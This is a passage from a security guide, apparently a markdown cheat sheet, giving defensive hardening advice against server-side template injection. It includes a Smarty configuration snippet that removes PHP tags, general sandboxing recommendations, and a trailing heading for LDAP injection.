- **Secure Configuration**: Disable or restrict features that allow JavaScript execution inside templates.
    
#### Smarty

- **Disable `{php}` Tags**: Prevent execution of PHP inside templates.
```rust
$smarty->security_policy->php_handling = Smarty::PHP_REMOVE;
$smarty->disable_security = false;
```

- **Use Secure Handlers**: Provide only safe modifiers/tags for user-controlled templates.
    
- **Regular Reviews**: Audit template code and update Smarty to the latest patched version.
    
### Sandboxing (General)

- **Function Restrictions**: Block dangerous operations like file access and command execution.
    
- **Variable Access Control**: Prevent templates from accessing global variables or sensitive data.



# LDAP Injection 

